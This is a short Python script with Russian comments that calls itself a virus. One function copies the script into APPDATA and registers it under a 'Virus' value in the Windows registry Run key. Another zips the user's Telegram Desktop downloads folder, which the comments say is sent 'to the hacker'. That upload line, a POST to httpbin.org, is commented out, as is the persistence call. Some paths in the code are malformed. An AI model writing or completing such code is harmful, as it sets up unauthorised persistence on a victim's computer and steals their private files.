import shutil
import os
import sys
import requests
from winreg import *


def run():
	'''Добавляется в автозагрузку копию'''
	# путь котрый светится в автозагрузке
	directory = os.getenv("APPDATA") + r"shifr.py" # shifr.py
	base_file = directory + os.path.basename(__file__)
	
	if not os.path.exists(directory):
		os.makedirs(directory)
		shutil.copy(__file__, base_file)
		
	# Путь в реестре
	path_to_reestr = OpenKey(HKEY_CURRENT_USER,
					r'SOFTWARE\Microsoft\Windows\Current\Version\Run',
					0, KEY_ALL_ACCESS)
					
	# Установить программу Virus в автозагрузку
	SetValueEx(path_to_reestr, 'Virus', 0, REG_SZ, base_file)
	
	# Закрыть реестр 
	CloseKey(path_to_reestr)
	
	
def addTozip():
	'''Добавляет папку в архив и отправляет хакеру'''
	# Добавляем папку в архив
	shutil.make_archive(r'C:\Users\User\Downloads\Telegram Desktop\\', 'zip', r'C:\Users\User\Downloads\Telegram Desktop\\')
	
	# Создает файл .zip
	#files = {'file.zip': open('C:\\file.zip', 'rb')}
	
	# Отправляет архив на сервер
	#r = requests.post('http://httpbin.org/post', files=files)
	
	
# ЗАПУСК ВИРУСА
#run()
addTozip()
